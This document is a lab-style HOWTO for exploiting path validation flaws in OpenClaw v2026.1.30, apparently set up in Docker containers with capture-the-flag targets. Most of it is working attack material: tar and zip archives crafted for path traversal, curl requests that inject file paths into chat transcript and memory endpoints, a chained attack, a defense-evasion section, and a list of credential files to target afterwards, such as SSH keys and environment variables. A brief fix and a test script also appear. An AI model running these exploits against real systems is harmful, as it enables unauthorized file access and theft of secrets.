# HOWTO: Exploit OpenClaw Path Validation Bypasses

## Overview

This guide demonstrates how to exploit multiple path validation vulnerabilities in OpenClaw v2026.1.30 to achieve directory escape and arbitrary file access.

## Vulnerability Analysis

### Step 1: Locate Vulnerable Code

Access the source code from the attacker container:

```bash
docker exec openclaw-attacker-path-validation bash
cd /app/openclaw-source/src
```

Examine vulnerable files:

```bash
# ZIP extraction vulnerability
cat infra/archive.ts | grep -A 5 "startsWith"

# TAR extraction (no validation)
cat infra/archive.ts | grep -A 3 "tar.x"

# Transcript path injection
cat gateway/server-methods/chat.ts | grep -A 5 "resolveTranscriptPath"

# Workspace validation
cat memory/manager.ts | grep -A 5 "startsWith"
```

### Step 2: Understand the startsWith() Vulnerability

The core vulnerability is using string prefix matching for path validation:

```typescript
// VULNERABLE PATTERN
if (!outPath.startsWith(params.destDir)) {
  throw new Error("path escapes destination");
}
```

**Why it fails:**

```
Base: /root/work
Malicious: /root/workspace/evil.txt

Check: "/root/workspace/evil.txt".startsWith("/root/work")
Result: TRUE ✓ (passes validation!)
Reality: File is in /root/workspace, NOT /root/work/

This is because "/root/work" is a STRING PREFIX of "/root/workspace"
```

**Correct validation would be:**

```typescript
const rel = path.relative(baseDir, targetPath);
const isInside = !rel.startsWith('..') && !path.isAbsolute(rel);
```

### Step 3: Verify Target Files

Check that sensitive files exist outside the workspace:

```bash
# From attacker container
docker exec openclaw-security-test-path-validation cat /etc/openclaw/flag.txt
# Output: FLAG{PATH_VALIDATION_BYPASS_SUCCESS}

docker exec openclaw-security-test-path-validation cat /root/secret.txt
# Output: SECRET{ROOT_FILE_ACCESSED}
```

## Exploitation Strategies

### Strategy 1: TAR Archive Path Traversal (EASIEST)

TAR extraction has **zero path validation**. This is the most straightforward attack.

**Create malicious TAR archive:**

```bash
# Create payload file
echo "EXPLOIT_SUCCESS" > payload.txt

# Create TAR with path traversal
mkdir -p malicious_tar
cd malicious_tar
ln -s ../../../etc/openclaw/flag.txt extracted_flag.txt
cd ..
tar -czf malicious.tar.gz -C malicious_tar .

# Alternative: Direct path traversal in TAR entries
echo "pwned" > test.txt
tar -czf evil.tar.gz --transform='s|^|../../../tmp/pwned/|' test.txt
```

**Upload and extract via OpenClaw:**

```bash
# If OpenClaw exposes archive extraction endpoint:
curl -X POST http://openclaw:18793/api/extract \
  -F "archive=@malicious.tar.gz" \
  -F "destination=/workspace/uploads"

# Files will be extracted to locations specified in TAR entries
# ignoring the destination parameter!
```

### Strategy 2: ZIP Prefix Bypass

Exploit the `startsWith()` weakness in ZIP extraction:

**Create directory structure:**

```bash
# In target container, create directories that share prefixes
docker exec openclaw-security-test-path-validation bash -c "
mkdir -p /root/work /root/workspace
echo 'FILE_IN_WORK' > /root/work/legit.txt
echo 'FILE_IN_WORKSPACE' > /root/workspace/bypass.txt
"
```

**Craft ZIP with bypass path:**

```python
#!/usr/bin/env python3
import zipfile
import os

# Create ZIP with path that bypasses startsWith check
with zipfile.ZipFile('bypass.zip', 'w') as zf:
    # If base is /root/work, this bypasses via prefix:
    zf.writestr('/root/workspace/extracted.txt', 'BYPASS_SUCCESS')
```

**Extract via OpenClaw:**

```bash
curl -X POST http://openclaw:18793/api/extract-zip \
  -F "zip=@bypass.zip" \
  -F "destDir=/root/work"

# File written to /root/workspace/ instead of /root/work/
# because "/root/workspace".startsWith("/root/work") == true
```

### Strategy 3: Transcript Path Injection

Exploit unvalidated sessionFile parameter:

```bash
# Inject arbitrary path
curl -X POST http://openclaw:18793/api/chat/transcript \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "test123",
    "sessionFile": "/etc/openclaw/flag.txt"
  }'

# Server calls resolveTranscriptPath() which returns sessionFile directly
# File contents from /etc/openclaw/flag.txt exposed
```

### Strategy 4: Workspace Validation Bypass

Exploit memory manager's workspace validation:

**Test workspace path validation:**

```python
#!/usr/bin/env python3
import requests

# Try to read file outside workspace
response = requests.post('http://openclaw:18793/api/memory/read', json={
    'path': '../../../etc/openclaw/flag.txt'
})

# Validation uses !relPath.startsWith('..')
# But may be bypassable with crafted paths
```

### Strategy 5: Combine Multiple Vulnerabilities

Chain vulnerabilities for maximum impact:

```bash
# Step 1: Upload malicious TAR (no validation)
curl -X POST http://openclaw:18793/api/upload \
  -F "file=@evil.tar.gz"

# Step 2: Extract with path traversal
curl -X POST http://openclaw:18793/api/extract \
  -d '{"archive":"/uploads/evil.tar.gz","dest":"/workspace"}'

# Step 3: Read extracted files via transcript injection
curl -X POST http://openclaw:18793/api/chat/transcript \
  -d '{"sessionFile":"/tmp/extracted/sensitive.txt"}'

# Step 4: Access via workspace bypass
curl -X POST http://openclaw:18793/api/memory/read \
  -d '{"path":"../../tmp/extracted/data.txt"}'
```

## Verification

### Verify Exploitation Success

```bash
# Check if exploit output exists
docker exec openclaw-attacker-path-validation cat /workspace/exploit_output.txt

# Should contain:
# FLAG{PATH_VALIDATION_BYPASS_SUCCESS}
# or
# SECRET{ROOT_FILE_ACCESSED}
```

### Verify Vulnerable Code

```bash
# Confirm startsWith() usage in source
docker exec openclaw-attacker-path-validation grep -n "startsWith" \
  /app/openclaw-source/src/infra/archive.ts

# Confirm TAR has no validation
docker exec openclaw-attacker-path-validation grep -n "tar.x" \
  /app/openclaw-source/src/infra/archive.ts

# Confirm transcript returns user input
docker exec openclaw-attacker-path-validation grep -n "return sessionFile" \
  /app/openclaw-source/src/gateway/server-methods/chat.ts
```

## Attack Flow Summary

```
1. Attacker crafts malicious input
   ├─ TAR archive with ../ entries
   ├─ ZIP with prefix-bypass paths
   └─ API calls with path injection

2. OpenClaw processes input
   ├─ archive.ts: startsWith() check bypassed
   ├─ TAR extraction: no validation at all
   └─ chat.ts: returns user path directly

3. Path validation fails
   ├─ Prefix matching accepts similar paths
   ├─ No canonicalization or symlink resolution
   └─ Root user amplifies impact

4. Files accessed/written outside workspace
   ├─ /etc/openclaw/flag.txt read
   ├─ /root/secret.txt accessed
   └─ Arbitrary locations writable via TAR

5. Attacker extracts sensitive data
   └─ FLAG{PATH_VALIDATION_BYPASS_SUCCESS}
```

## Defense Evasion

These vulnerabilities are difficult to detect because:

- **Legitimate-looking paths**: `/root/workspace` looks valid for `/root/work` base
- **Built-in functions**: Uses Node.js `tar.x()` which appears safe
- **No external indicators**: Pure path manipulation, no network signatures
- **Root privileges**: All file operations succeed without permission errors

## Proof of Concept Scripts

### Complete TAR Exploitation

```bash
#!/bin/bash
# Create malicious TAR and upload

# Create payload
echo "FLAG{PATH_VALIDATION_BYPASS_SUCCESS}" > flag.txt

# Create TAR with absolute paths escaping workspace
tar -czf exploit.tar.gz --transform='s|^|../../../etc/openclaw/|' flag.txt

# Upload to OpenClaw (implementation depends on available endpoints)
# ...

# Verify extraction
ls -la /etc/openclaw/
cat /etc/openclaw/flag.txt
```

### Python Path Traversal Test

```python
#!/usr/bin/env python3
import os.path

def test_startswith_bypass():
    base = "/root/work"
    malicious = "/root/workspace/evil.txt"

    # Vulnerable check
    if malicious.startswith(base):
        print(f"BYPASS! {malicious} passes check for {base}")
        print("Vulnerability: String prefix matching")

    # Correct check
    rel = os.path.relpath(malicious, base)
    if rel.startswith('..'):
        print(f"BLOCKED: {malicious} correctly rejected")

test_startswith_bypass()
```

## Additional Targets

Once path traversal is achieved:

- `/etc/passwd` - System user information
- `/root/.ssh/id_rsa` - SSH private keys
- `/root/.bash_history` - Command history
- `/proc/self/environ` - Environment variables (may contain secrets)
- Application config files with credentials
- Database files
- Log files with sensitive data

## Notes

- **Real vulnerability** in OpenClaw v2026.1.30
- Multiple independent vulnerabilities compound the risk
- Root container execution is critical component
- TAR extraction being completely unvalidated is most severe
- Exploitation requires understanding of Node.js path handling
